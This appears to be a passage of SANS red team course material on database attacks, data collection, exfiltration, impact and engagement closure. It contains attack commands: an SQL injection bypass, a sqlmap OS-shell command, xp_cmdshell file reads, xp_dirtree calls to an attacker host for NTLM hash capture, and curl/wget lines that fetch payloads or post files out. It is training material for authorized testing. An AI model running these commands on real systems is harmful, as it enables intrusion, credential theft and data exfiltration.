## **Action on Objectives**

The final phase of the Unified Kill Chain is the action on objectives. These TTPs will depend on the adversary being emulated and the goals and objectives of the engagement. Most adversaries will be after data, in which case they will need to collect it, stage it, and then exfiltrate it. Other malicious actors may be after denial of service, destructive attacks, or ransomware. Based on the goals and objectives, these steps will be different for each engagement.

Reference:

https://[www.csacademy.nl/images/scripties/2018/Paul-Pols---The-Unified-Kill-Chain.pdf](http://www.csacademy.nl/images/scripties/2018/Paul-Pols---The-Unified-Kill-Chain.pdf)

© 2022 SANS Institute	91

|  Module Objectives: Database Attacks The objective for this module is to understand: Structured Query Language and Syntax Database Credential Hunting SQL Injection SQLMap xp\_cmdshell Trust Abuse through SQL Links PowerUpSQL |  |
| :---- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**92** |

## **Module Objectives: Database Attacks**

In this module we want to explore transactional databases and the language used for interacting with the most popular databases. SQL, or Structured Query Language, allows the retrieval, storage, modification, and removal of data. A common and critical flaw of SQL database interaction is SQL Injection. SQLi allows an attacker to manipulate the server due to a lack of input sanitization. SQLMap is a great tool that automates the enumeration and attacking of SQL servers through a web form that is vulnerable to SQLi. With Microsoft SQL servers we can get code execution through xp\_cmdshell functionality—functionality that we can use across trusts through SQL Trusted Links. Lastly, we will introduce the PowerUpSQL tool that automates attacks against MSSQL servers.

92	© 2022 SANS Institute

|  Databases	Database Attacks Databases (DB) have a wealth of sensitive information and immediately drive up the impact of operations Most popular: Oracle, MySQL, MSSQL, PostgreSQL, MongoDB Some direct DB attacks Most through connected application or from credentials |  |
| :---- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**93** |

## **Databases**

Databases are usually an end goal for adversaries and offensive security teams because that's where most of the sensitive information lives. Getting RCE is one thing but leveraging RCE to access millions of sensitive records is a much more impactful finding. The most popular databases based on deployment are:

* Oracle

* MySQL (MariaDB is sort of an extension)

* MSSQL

* PostgreSQL

* MongoDB

  While there are vulnerabilities that affect the database itself, most of the attacks leverage pivoting through a web server or another system with direct or legitimate access. This is usually due to the fact that the attack surface on a web server is usually larger than the attack surface of a database.

  References:

  https://[www.c-sharpcorner.com/article/what-is-the-most-popular-database-in-the-world/](http://www.c-sharpcorner.com/article/what-is-the-most-popular-database-in-the-world/) https://[www.oracle.com/database/](http://www.oracle.com/database/)

  https://[www.mysql.com/](http://www.mysql.com/)

  https://[www.microsoft.com/en-us/sql-server/sql-server-2019](http://www.microsoft.com/en-us/sql-server/sql-server-2019) https://[www.postgresql.org/](http://www.postgresql.org/)

  https://[www.mongodb.com/](http://www.mongodb.com/)

  © 2022 SANS Institute	93

|  Structured Query Language (SQL)	Database Attacks Structured Query Language (SQL) is a programming language used to interact with a relational database management system (RDBMS) to store, manipulate, and retrieve data A relational database has a strict predefined structure, like a table Oracle, MySQL, MSSQL, PostgreSQL Columns hold the same type of data Rows are a collection of related values NoSQL is the syntax used to interact with non-relational databases, like MongoDB or AWS Redshift Instead of tables, data storage is optimized for performance |  |
| :---- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**94** |

## **Structured Query Language (SQL)**

Structured Query Language (SQL) is a programming language used to interact with a relational database management system (RDBMS) to store, manipulate, and retrieve data. Data is stored in tables with columns that hold the same type of data and rows that are a collection of related values.

NoSQL is the syntax used to interact with non-relational databases, like MongoDB or AWS Redshift; instead of tables, data storage is optimized for performance.

Reference:

https://docs.mongodb.com/manual/reference/sql-comparison/

94	© 2022 SANS Institute

|  |  |  |  |  |  |
| :---- | :---- | :---- | :---- | :---- | :---- |
|  | **SQL Syntax** |  |  | Database Attacks |  |
|  | \-- SELECT retrieves data **SELECT id, name FROM nicks;**  \-- UPDATE modify data **UPDATE nicks SET name='El Duderino' WHERE ID=1;**  \-- DELETE removes data **DELETE nicks WHERE name='Duder';** |  | \-- INSERT INTO adds data **INSERT INTO nicks (name) VALUES ('The Dude');**  \-- CREATE TABLE **CREATE TABLE cdata (line varchar(8000));**  \-- DROP TABLE **DROP TABLE cdata;** |  |  |
|  |  | SEC565 | Red Team Operations and Adversary Emulation	**95** |  |  |  |

## **SQL Syntax**

Here is a short overview of common SQL syntax. There is a structure to the language and statements for interacting with the data in the database. We won't go into much further detail—table joining and third normal form would be the next topic of study—but we can keep our coverage at a high level in order to understand the SQL Injection vulnerability.

Reference:

https://docs.mongodb.com/manual/reference/sql-comparison/

© 2022 SANS Institute	95

|  Database Credential Hunting	Database Attacks Systems need to authenticate with backend databases Credentials may be in different places based on the configuration Hard coded in a configuration file or code Environment variables Secret Manager Programmatic in-memory storage Cloud-Native Secret Manager Access to the underlying system allows access to the credentials |  |  |  |
| :---- | :---- | :---- | :---- |
|  | **Red Team Tip:** Pivot through the system hosting the application when communicating the backend database to avoid unusual traffic patterns. |  |  |
|  |  | SEC565 | Red Team Operations and Adversary Emulation	**96** |  |

## **Database Credential Hunting**

The only way for a web or desktop application to access content in a database is through authentication. This authentication is usually done through credentials or a connection string. Our goal is to hunt down those credentials. They have to be stored somewhere, you may find them on the system itself or in a code/configuration repository.

Common configurations

* Hard coded in a configuration file or code: Easy to locate if you have access to the host or a code repository.

* Environment variables: Credentials are stored in the environment and access to the hosted system is required.

* Secret Manager: The database credentials are stored in a vault, but access to the vault must be provided by the connected system. Therefore, access to the connected system may allow access to the vault.

* Programmatic in-memory storage: Like environment variables and Secret Manager, protects the credentials on a build host but there is still an access mechanism. Red teamers would try to leverage that access mechanism in order to collect valid credentials, or simply scrape memory.

* Cloud-Native Secret Manager: Access to the Secret Manager is restricted by host. Red teamers can bypass restrictions by pivoting through the host.

  While sometimes necessary, it is always suggested to pivot through a web or desktop that has legitimate database access to avoid creating an unusual traffic pattern. In most cases database traffic is contained to a few paths.

  Reference:

  https://[www.linkedin.com/pulse/storing-database-credentials-securely-siddhesh-jog/](http://www.linkedin.com/pulse/storing-database-credentials-securely-siddhesh-jog/)

  96	© 2022 SANS Institute

|  SQL Injection	Database Attacks SQL injection or SQLi allows a user to inject SQL syntax into an input form resulting in a manipulation of the SQL query |  |  |  |
| :---- | :---- | :---- | :---- |
|  | $mysqli \= new mysqli("localhost", "root", "", "sec565"); $user \= $\_POST\["username"\] $pass \= md5($\_POST\["password"\]) $sql \= "SELECT id, user, pass FROM users WHERE user='" . $user . "' and pass='" . $pass . "'"; result \= $mysqli-\>query($query) \--- if **$user=pwneip** and **$pass=667ff118ef6d196c96313aeaee7da519** SELECT id, username, password FROM users WHERE username='pwneip' and password='667ff118ef6d196c96313aeaee7da519' if **$user=pwneip' OR 1=1 \--** and **$pass=667ff118ef6d196c96313aeaee7da519** SELECT id, username, password FROM users WHERE username= 'pwneip' OR 1=1 *\--' and password='667ff118ef6d196c96313aeaee7da519'* |  |  |
|  |  | SEC565 | Red Team Operations and Adversary Emulation	**97** |  |

## **SQL Injection**

In this example we have a PHP web server that is accepting POST data and checking for authentication. The code snippet is immature and vulnerable to SQLi because there is no sanitization of input. The intended SQL statement is:

SELECT id, username, password FROM users WHERE username='pwneip' and password='667ff118ef6d196c96313aeaee7da519'

But we are able to modify the statement and break the logic by inserting "**pwneip' OR 1=1 \-- "** into the form.

SELECT id, username, password FROM users WHERE username= 'pwneip' OR 1=1 *\--' and password='667ff118ef6d196c96313aeaee7da519'*

The final result is dependent upon how the developer is using the returned data, but it is likely we have bypassed authentication and will assume the context of the first user in the returned data from the SQL statement.

© 2022 SANS Institute	97

|  SQLMap	Database Attacks Open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws Powerful detection engine Database fingerprinting Command execution Timing attacks Authors Bernardo Damele A. G. (@bdamele) Miroslav Stampar (@stamparm) |  |
| :---- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**98** |

## **SQLMap**

SQLMap is an open-source penetration tool that automated the process of detecting and exploiting SQL injection flaws. It has an extensive library of fingerprints of most production databases. It will automatically enumerate the database, export data, or trigger command injection. The syntax can be verbose but the tool allows precise control over a plethora of attacks.

References:

https://sqlmap.org/ https://github.com/sqlmapproject/sqlmap

98	© 2022 SANS Institute

## **SQLMap in Action**

In the above terminal capture, we are using SQLMap to target a MySQL database. If we know the database type beforehand, we can specify it with the \--dbms command line argument, otherwise sqlmap will do several checks to narrow it down. We specify the resource we are attacking and create a post request by using \--data variable=data and lastly we request an os shell with \--os-shell.

\# **sqlmap \-u [http://db.threatsims.com/index.php](http://db.threatsims.com/index.php) \-p search \--data search=inject \--dbms mysql \--os-shell**  
web server operating system: Linux Ubuntu

web application technology: PHP 5.5.9, Apache 2.4.7 back-end DBMS: MySQL \>= 5.0.0

| Spawns a Windows command shell and passes in a string for execution Output is returned as rows of text |  |  |  \-- Enable xp\_cmdshell **EXEC sp\_configure 'show advanced options', 1; RECONFIGURE; EXEC sp\_configure 'xp\_cmdshell', 1; RECONFIGURE;**  \-- Read from file system **EXEC master.dbo.xp\_cmdshell 'type C:\\config.ini'**  \-- Local file access **CREATE TABLE cdata (line varchar(8000)); BULK INSERT cdata FROM 'C:\\inetpub\\wwwroot\\web.config'; DROP TABLE cdata;** |  |  |

## **xp\_cmdshell**

xp\_cmdshell is a MSSQL function that allows code execution. It spawns a windows command shell, passes in a string, and then returns the results as rows of text. Some possible uses are:

\-- Enable xp\_cmdshell on the server first **EXEC sp\_configure 'show advanced options', 1; RECONFIGURE;**

## **EXEC sp\_configure 'xp\_cmdshell', 1; RECONFIGURE;**

\-- Access a local file on the server, load the contents into a table for retrieve, then drop the table

## **CREATE TABLE cdata (line varchar(8000));**

**BULK INSERT cdata FROM 'C:\\inetpub\\wwwroot\\web.config'; DROP TABLE cdata;**

\-- We can gather NTLM hashes by having the server access an UNC path where a fake mssql server is hosted  
**xp\_dirtree '\\\\\<attacker\>\\something'**

**exec master.dbo.xp\_dirtree '\\\\\<attacker\>\\something'**

msf\> **use auxiliary/admin/mssql/mssql\_ntlm\_stealer**

References:

https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15

https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

100	© 2022 SANS Institute

|  Trust Abuse through SQL Links	Database Attacks Microsoft SQL Server allows links to be created to external sources Any database user can attempt to access server links If dataaccess set to 1, any user can use the link If configured with SQL account, any access is a masquerade Shell access via link select 1 from openquery("linkedserver",'select 1;exec master..xp\_cmdshell '"dir c:"') Leverage trust relationships to query downstream SQL servers Links can be chained, even across forests trusts MSF enumeration msf\> use exploit/windows/mssql/mssql\_linkcrawler |  |
| :---- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**101** |

## **Trust Abuse through SQL Links**

Microsoft SQL servers allow links between servers to share database access. These external sources can be other SQL servers, Oracle Servers, Azure SQL Database, Azure SQL Managed Instance, Azure Synapse Analytics, Analytics Platform System (Analytics Platform System (PDW)), or Azure SQL Edge. Any user can attempt to access a server link. If the dataaccess value is set to 1, then any user can use that link. If the link is configured with a SQL account, then any access will be through with the context of that configured user.

Shell access is provided through chaining openquery through the link and using xp\_cmdshell:

## **select 1 from openquery("linkedserver",'select 1;exec master..xp\_cmdshell '"dir c:"')**

These links also traverse forests trusts and can be chained.

Metasploit framework has an enumeration script that will attempt to use each link and deploy a payload.

## msf\> **use exploit/windows/mssql/mssql\_linkcrawler**

References:

https://[www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/](http://www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/) [http://technet.microsoft.com/en-us/library/ms190479.aspx](http://technet.microsoft.com/en-us/library/ms190479.aspx)

https://docs.microsoft.com/en-us/sql/t-sql/statements/create-external-data-source-transact-sql?view=sql-server-ver15\&tabs=dedicated

https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/mssql/mssql\_linkcrawler.rb

© 2022 SANS Institute	101

## **PowerUpSQL**

PowerUpSQL by NetSPI and authored by Scott Sutherland (@\_nullbind) is a PowerShell toolkit used in attacking MSSQL servers. Some of the functions provided by the toolkit are:

* SQL Server discovery

* Weak configuration auditing

* Privilege escalation on scale

* Post exploitation actions  
  This toolkit can be used by the red team for attacks and the defenders for auditing. References:

  https://github.com/NetSPI/PowerUpSQL https://github.com/NetSPI/PowerUpSQL/wiki

## **Module Summary: Database Attacks**

In this module we did a brief introduction to databases and especially those that use Structured Query Language for interaction. SQL, or Structured Query Language, allows the retrieval, storage, modification, and removal of data. SQL Injection allows an attacker to manipulate the server due to a lack of input sanitization. SQLMap is a great tool that automates the enumeration and attacking of SQL servers through a web form that is vulnerable to SQLi. With Microsoft SQL servers we can get code execution through xp\_cmdshell functionality—functionality that we can use across trusts through SQL Trusted Links. Lastly, we introduced the PowerUpSQL tool that automates attacks against MSSQL servers.

© 2022 SANS Institute	103

## **Module Objectives: Collection, Exfiltration, and Impact**

In this module we will cover three attack phases: collection, exfiltration, and impact. Once the red team is on a high value target with sensitive data, they will stage the data for exfiltration, looking for sensitive data that drives up the impact of the compromise.

© 2022 SANS Institute	105

|  Collection	Collection, Exfiltration, and Impact Tactic used to identify and gather data from target network A common tactic of many adversaries is to steal information Some techniques of collection Audio Capture (listen in on conversations) Clipboard Data (common for end users with password managers) Data from Storage (local disk, shared drives, etc.) Input Capture (keylogging) Person in the Browser Screen and Video Capture |  |
| ----- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**106** |

## **Collection**

Collection consists of techniques used to identify and gather information, such as sensitive data, from a target prior to exfiltration. This is generally focused on the adversary objectives and needs to be clearly communicated to ensure rules of engagement are followed.

* **Audio Capture:** Enabling the microphone to record conversations

* **Automated Collection:** Leveraged by adversary malware to automatically collect information related to lateral movement or objectives

* **Clipboard Data:** Stealing data used during copy and paste operations; covered in a previous slide

* **Data from Information Repositories:** Organizations share data through several repositories, such as SharePoint or Confluence

* **Data from Local System:** Interesting data stored on the local file system

* **Data from Network Shared Drive:** Interesting data stored on network shares; it is common to see large, unprotected shares used by end users

* **Data from Removable Media:** Interesting data stored on external storage such as USB

* **Data Staged:** Moving data to a central location in preparation of exfiltration

* **Email Collection:** Reading target email looking for sensitive information

* **Input Capture:** Keylogging to obtain sensitive information; covered in credential access

* **Person in the Browser:** Hooking the browser to intercept end user browsing; often provides access to history, saved credentials, etc.

* **Screen Capture:** Taking screenshots to see what the end user is doing

* **Video Capture:** Taking video of the end user through the webcam

  Reference: https://attack.mitre.org/tactics/TA0009/

  106	© 2022 SANS Institute

|  Screen Capture	Collection, Exfiltration, and Impact Useful for obtaining sensitive information Ensure the rules of engagement allows screen capture Most red team and adversary malware has the capability of taking screenshots OSX: The native command screencapture is used to capture screenshots Linux: There is the native command xwd Empire: usemodule collection/screenshot Covenant: Screenshot task |  |
| ----- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**107** |

## **Screen Capture**

Red team should attempt to take screen captures of the desktop to gather information over the course of an engagement. Screen capturing functionality is generally included in most remote access tools created by adversaries and in most red team payloads for post-exploitation. It is also included as native features in some operating systems:

* On OSX, the native command **screencapture** is used to capture screenshots

* On Linux, there is the native command **xwd**

* On Empire, **usemodule collection/screenshot**  
* Covenant, Screenshot task

  Reference:

  https://attack.mitre.org/techniques/T1113/

  © 2022 SANS Institute	107

|  Data Staging	Collection, Exfiltration, and Impact Move collected data to a central location for exfiltration Client/Server Architecture	•	Common Protocols Push or Pull	– TFTP OpSec	– FTP Encrypt in transit	– SCP, part of SSH suite Authentication	– HTTP or HTTPS SMB NFS |  |
| ----- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**108** |

## **Data Staging**

Data staging consisting of moving the collected data to a central location in preparation for exfiltration. Moving files generally relies on a client/server architecture. The source and destination must have one or the other.

Depending on the firewall rules, red team can push a file or pull files. Consider a protocol that encrypts data in transit and has authentication to not introduce risk.

There are many protocols used in internal networks to transfer files. The choice will be based on the tools available on the target system and the firewall rules:

* **TFTP:** Stripped-down service moves files with no authentication between a TFTP client and TFTPD using UDP port 69\.

* **FTP:** Familiar service conveniently moves files using two connections: an FTP data connection associated with TCP port 20 and an FTP control connection associated with TCP port 21\. FTP, when used in ASCII mode, corrects some issues with moving text files between different operating systems, as we'll discuss soon.

* **SCP, part of SSH suite:** This program is part of the Secure Shell (SSH) suite and transfers files using TCP port 22 by default. It is an ideal candidate for file transfers, given that a) it encrypts all authentication information and data in transit, b) most networks allow outbound SSH, and c) many Linux and UNIX systems have an SCP client built in.

* **HTTP or HTTPS:** These protocols are almost always allowed outbound, using at least TCP ports 80 and 443\. Web browsers are found on most operating systems: Internet Explorer, wget, Lynx, etc. PowerShell includes a WebClient feature and an alias of wget to pull files.

* **SMB:** Built into Windows and available on \*nix via Samba and very common on networks through the default TCP port of 445\.

* **NFS:** This protocol is most commonly used to move files between UNIX/Linux systems, although there are also Windows NFS implementations. By default, it uses TCP and UDP 204, although it may involve other ports as well.

  Reference: https://attack.mitre.org/techniques/T1074/

  108	© 2022 SANS Institute

|  Exfiltration	Collection, Exfiltration, and Impact Tactic that results in removing data from target network Compress and then encrypt data Consider splitting data into smaller pieces Leverage existing C2 or alternative Protocol Network Medium Physical Medium Blend in: Scheduled transfer during regular business hours |  |
| ----- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**109** |

## **Exfiltration**

The exfiltration tactic covers techniques that result in the removal of files and data from the target network after collection. Collection tactic covers a technique of data staging where all the data is brought to an ideal location for removing. Now it is time for the red team to transfer the collected data from the target network to the red team network. Ensure the data being exfiltrated is allowed in the rules of engagement.

* **Automated Exfiltration:** Leveraging automated scripts after collection to exfiltrate data.

* **Data Compressed:** Making the data portable to minimize size before transferring; often leveraging 7-Zip, RAR, ZIP, and similar formats.

* **Data Encrypted:** Hide the data and important for operational security before transferring; same compression utilities can perform encryption.

* **Data Transfer Size Limits:** Splitting the data into smaller chunks for blending in; same compression/encryption utilities can perform splitting.  
* **Exfiltration Over Alternative Protocol:** Leveraging a protocol other than current C2 such as FTP, DNS, HTTPS, SMTP, or cloud storage.

* **Exfiltration Over Command-and-Control Channel:** Exfiltrating over current C2 channels.

* **Exfiltration Over Other Network Medium:** Other network medium not used by current C2 such as Wi-Fi, Cellular, Bluetooth, or RF channels.  
* **Exfiltration Over Physical Medium:** Removing data through USB or other external physical device.

* **Scheduled Transfer:** Blending in by transferring data during regular business hours.

  Reference:

  https://attack.mitre.org/tactics/TA0010/

  © 2022 SANS Institute	109

|    $ wget [http://x.x.x.x/resource.ext](http://x.x.x.x/resource.ext) \-O payload $ wget [http://x.x.x.x/resource.ext](http://x.x.x.x/resource.ext) \-P payload $ curl [http://x.x.x.x/resource.ext](http://x.x.x.x/resource.ext) \-o file	Linux HTTP $ curl \-X POST \--data-binary @file [http://x.x.x.x/](http://x.x.x.x/) $ php \-S 0.0.0.0:8000 |  |
| :---- | :---- |

## **OpSec Unsafe Exfiltration**

This slide shows several data transfer options, but unfortunately, they are OpSec unsafe because the data is being sent in the clear. Use these only when necessary and never with sensitive information. If these are your only file transfer options, then ensure all data is encrypted before transmission.

References:

https://book.hacktricks.xyz/exfiltration

https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil https://pypi.org/project/pyftpdlib/

https://[www.npmjs.com/package/ftp-srv](http://www.npmjs.com/package/ftp-srv)

These file transfer options are much safer because they use encryption when transferring data.

112	© 2022 SANS Institute

|  Impact	Collection, Exfiltration, and Impact Availability and integrity objectives Rarely emulated by red team Simulate or show position and privilege Data Destruction, Encryption, or Manipulation Denial of Service Defacement Disk Content or Structure Wipe Service Stop Find ways to demonstrate safely Add comments to code or HTML Leave a file on the system |  |
| ----- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**113** |

## **Impact**

The impact tactic was added in the April 2019 release of the MITRE ATT\&CK® and represents techniques with the primary objective of reducing availability or integrity. These tactics are often called destructive objectives and cover these 14 techniques:

* **Data Destruction:** Deleting files or data on target systems.

* **Data Encrypted for Impact:** Encrypting data often for ransom.

* **Defacement:** Modifying the content of a target, often a web application.

* **Disk Content Wipe:** Deleting an entire disk.

* **Disk Structure Wipe:** Deleting or corrupting the entire hard drive data structure.

* **Endpoint Denial of Service:** Block availability of all services on endpoint.

* **Firmware Corruption:** Deleting BIOS or startup content to break startup processes.

* **Inhibit System Recovery:** Deleting backups or services used for recovery.

* **Network Denial of Service:** Degrading the network resources.

* **Resource Hijacking:** Leveraging the hardware of a system for resource intensive things like crypto mining.

* **Runtime Data Manipulation:** Integrity attack against the data being used.

* **Service Stop:** Denial of service at the service level.

* **Stored Data Manipulation:** Modifying integrity of data at rest.

* **Transmitted Data Manipulation:** Modifying integrity of data in motion/transmit.

  While these objectives may be realistic for the adversary the red team is emulating, it is rarely an objective the red team will carry out fully. Instead, these techniques may be simulated, or the red team can show they have reached a position and privilege where they can be carried out without impacting the target organization.

  References:

  Impact: https://attack.mitre.org/tactics/TA0040/

  April 2019 Updates: https://attack.mitre.org/resources/updates/updates-april-2019/index.html

  © 2022 SANS Institute	113

|  Emulating Ransomware	Collection, Exfiltration, and Impact Is emulating ransomware even possible? Of course, it is\! The secret is not to encrypt or destroy production data. Instead, create new files before emulating typical ransomware steps of encrypting, exfiltrating, and obtaining a ransom note. This method ensures no data is ever at risk of being encrypted, destroyed, or leaked. |  |
| ----- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**114** |

## **Emulating Ransomware**

A day hardly goes by without hearing about another ransomware attack. Ransomware is a type of malicious software designed to block access to systems and/or data until a sum of money is paid. It is one of the dominant methods that criminals are getting return of investment (ROI) on from their malicious activities. There are lots of examples of ransomware in the past few years, from WannaCry to NotPetya to almost a daily news feed of new attacks with Maze and Ryuk.

Is emulating ransomware even possible? Of course, it is\! The secret is to not encrypt or destroy production data. Instead, create new files and then execute the typical ransomware steps of encrypting, exfiltrating, and obtaining a ransom note. This method ensures no data is ever at risk of being encrypted, destroyed, or leaked.

References:

https://[www.scythe.io/library/threatthursday-ransomware](http://www.scythe.io/library/threatthursday-ransomware) https://[www.scythe.io/library/threatthursday-maze](http://www.scythe.io/library/threatthursday-maze) https://[www.scythe.io/library/threatthursday-ryuk](http://www.scythe.io/library/threatthursday-ryuk)

|  Module Summary: Collection, Exfiltration, and Impact Collection Data Staging Exfiltration OpSec unsafe OpSec safe Impact Emulating Ransomware |  |
| :---- | :---- |
|  ![][image1] | SEC565 | Red Team Operations and Adversary Emulation	**115** |

## **Module Summary: Collection, Exfiltration, and Impact**

In this module we covered three attack phases: collection, exfiltration, and impact. Finding sensitive information is a quick way to increase the impact of a red team engagement. When transferring any data, whether it's a payload or sensitive files pulled from a system, always think about your OpSec profile and what the data looks like in transit. Always opt for secure transfers by using encryption.

© 2022 SANS Institute	115

## **Module Objectives: Engagement Closure**

For closing the engagement, we want to clean up the environment, ensure all our actions were recorded, and start to do some analysis. We get to reveal what the red team did and just how they did it. And the most important aspect that is often a chore: the report\!

© 2022 SANS Institute	119

|  Closure Phase	Engagement Closure Analysis and Response Red Team Reveal Replay Purple Team Reporting	Red Team Framework & Remediation and Action Plan	Methodology People	(RTFM) Process Technology |  |
| :---- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**120** |

## **Closure Phase**

While it may feel like the red team engagement and adversary emulation is now over, one of the most important phases of the framework is required. This is arguably where the value of the entire effort is provided to the target organization based on what was identified during the testing phase.

**Analysis and Response:** Organized and led by the project manager, this phase will have the red team present to the blue team all the actions performed during testing, often called a Red Team Reveal. The blue team will be tasked with correlating actions with the events they witnesses, the incident response process followed, and communication that occurred. This phase may also include a replay where a purple team engagement is performed, non-blind for the blue team to follow along technically as TTPs are repeated.

**Reporting:** Creating a report is crucial and will be references for months or even years after the exercise closure. The entire extent of the exercise, from threat intelligence to planning to testing to analysis and response, will be documented. These reports should be reviewed by all trusted agents prior to final draft publishing. Generally, the project manager will take lead of compiling the report.

**Remediation and Action Plan:** The last phase is documenting how the target organization plans to remediate the identified issues and create an action plan against it. It is important that the red team distance themselves from this phase and allow the engineers and business to create their action plan. The red team may recommend several solutions but ultimately, the stakeholders for each item should come together and provide this themselves. This phase is also led and organized by the project manager.

120	© 2022 SANS Institute

|  Red Team Actions	Engagement Closure  After objective is achieved, some additional steps: Consolidate all data	•	All modifications and All red team logs and notes	mechanisms must be removed Data collected	at the end of the engagement Red team lead review and	– Revert all system modifications acceptance	– Remove all access mechanisms Archive, hash, and securely	– Remove C2 mechanisms store all data Final report |  |
| ----- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**121** |

## **Red Team Actions**

While this section will cover project management type closure activities from various frameworks presented in Section 1, many people forget the red team needs to perform some closure activities as well. Once the objective is achieved, the project manager and other trusted agents should decide whether to maintain access to the systems and inject triggers for measuring other blue team responses or if the red team should clean up, pack up, and close the technical portion of the exercise.

The red team lead should ensure all data and logs were saved and securely stored. All systems should be cleaned up and left how they were originally found. That means killing all payloads and remote connections. The attack infrastructure should be brought down and removed from listening on the internet.

© 2022 SANS Institute	121

|  Analysis and Response	Engagement Closure Are the red team's actions during the attack phase well documented and understood? Has the incident response process missed any substantial red team actions? Are there any IoCs or artifacts that are still beaconing or discoverable in the future? Have any artifacts or other IOCs survived incident response? How thorough was the blue team's incident response through eradication and lessons learned? |  |
| :---- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**122** |

## **Analysis and Response**

The red team reveal meeting will result in many questions and some work for the blue team. Here, we cover some aspects that may come up based on author experiences:

**Are the red team's actions during the attack phase well documented and understood?** The red team should also be measured during analysis and response phase to ensure they followed the threat intelligence and planning phase components, especially the rules of engagement and documenting all actions.

**Has the incident response process missed any substantial red team actions?** By the end of the exercise, all red team infrastructure and payloads should be dead. If not, they may be used in replay or for a purple team reveal coming up shortly.

**Are there any IoCs or artifacts that are still beaconing or discoverable in the future?** While the red team tried to clean up as much as possible, are there any artifacts or payloads still on the target systems that were not removed?

**Have any artifacts or other IOCs survived incident response?** Empire has a kill date that can be configured on its beacons. This is a reason why red team must understand all their tools and payloads.

**How thorough was the blue team's incident response through eradication and lessons learned?** This is not a perfect metric but more observable. Other items will have much better metrics, such as time to detect initial access.

Reference:

https://github.com/magoo/redteam-plan\#skull-post-mortem

122	© 2022 SANS Institute

|  VECTR Test Cases	Engagement Closure  ![][image2] |  |
| :---- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**123** |

## **VECTR Test Cases**

The screenshot is from the VECTR tool when a test case is being filled out. The left side is the red teamwork, which should be tracked and logged as discussed throughout the course. The right side is the blue team details. The project manager can sit with the blue team trusted agent and populate the fields:

* Outcome: Was the event logged, blocked, or alerted?

* What tool logged the activity or should have logged the activity?

* What was the severity of the alert?

* What time was the item logged?

* What layer of security should have seen this test case?

* Other notes and behavior can be logged in the remaining fields.

  Reference:

  https://vectr.io/

  © 2022 SANS Institute	123

|  Red Team Reveal	Engagement Closure  Work together as one large team led by project manager Limit attendance to blue team and trusted agents for now Project manager to present threat intelligence and planning Red team to present a timeline and step-by-step actions Blue team will have all kinds of questions for the red team This can be a moment of excitement if done correctly Keeping the relationship healthy is critical for internal teams Red team should be viewed as an invaluable sparring partner |  |
| ----- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**124** |

## **Red Team Reveal**

The "blind" part of the exercise is complete; it is time to come together as one large team to perform exercise closure steps. The project manager will organize and lead the red team reveal. This is where the blue team that are not trusted agents will hear the end-to-end story of red team actions. It is recommended that audience be limited at this phase as to not embarrass anyone or facilitate a stakeholder to perform actions/remediation on the fly. Trusted agents may be invited as they have heard most of the actions as they occurred during the daily briefings.

The project manager should lead the presentation and start with the threat intelligence and planning phase. A member of the threat intelligence team may present their respective part. Red team should present the actions performed at a high level as the adversary emulation occurred following the threat intelligence provided. Blue team will have many questions for the red team. It is important the project manager lead this session and maintain it while being energetic and friendly. For internal teams, the relationship should grow, not be adversarial.

Reference:

https://github.com/magoo/redteam-plan\#mag-red-team-reveal

124	© 2022 SANS Institute

|  Example Escalation Path	Engagement Closure   ![][image3]  |  |
| :---- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**125** |

This slide shows an example of how to illustrate the high-level actions performed by the red team during the adversary emulation exercise. There are many ways to visualize this: charts, timelines, or a solution like VECTR.

|  Replay	Engagement Closure Red team may have to repeat a test case or action to properly determine if something was logged or alerted after the exercise The replay is an excellent learning opportunity for non-technical staff and blue team members Presenting is valuable but seeing is believing Does not have to be a complete replay and can focus on certain TTPs only |  |
| :---- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**126** |

## **Replay**

Depending on the analysis and response results, the red team may be asked to replay certain test cases that may have been missed or not properly recorded. This is a reason why the red team may be asked to leave the attack infrastructure up and running after the objective is reached. The replay is an excellent learning opportunity for non-technical staff and blue team members to shadow and see what the red team sees. It also offers an opportunity for the trusted agents to see the tactics, techniques, and procedures as they begin considering the remediation and action plans. Note the replay does not have to be the complete exercise; it can focus on certain TTPs, test cases, or actions performed by the red team.

126	© 2022 SANS Institute

|  Purple Team	Engagement Closure  Perform non-blind adversary emulation with red and blue Red team emulate adversary TTPs while blue teams watch and improve detection and response policies, procedures, and technologies in real time Helps culture of collaboration Everyone learns something Alternate between blind and non-blind Red blue |  |
| ----- | :---- |
|  | SEC565 | Red Team Operations and Adversary Emulation	**127** |

## **Purple Team**

Purple teaming is a function or process, not an individual team, where the red and blue teams work together. While many red team exercises and adversary emulations are performed "blind" from the blue team perspective, purple team engagements are fully known and performed together with the blue team. Not all adversary emulations or smaller red team exercises have to be blind. Instead, alternate between blind and non-blind purple team exercises. This will allow for better culture of collaboration between the two teams.

## **SANS Course:**

SEC599: Defeating Advanced Adversaries \- Purple Team Tactics & Kill Chain Defenses https://[www.sans.org/cyber-security-courses/defeating-advanced-adversaries-kill-chain-defenses/](http://www.sans.org/cyber-security-courses/defeating-advanced-adversaries-kill-chain-defenses/)

Reference:

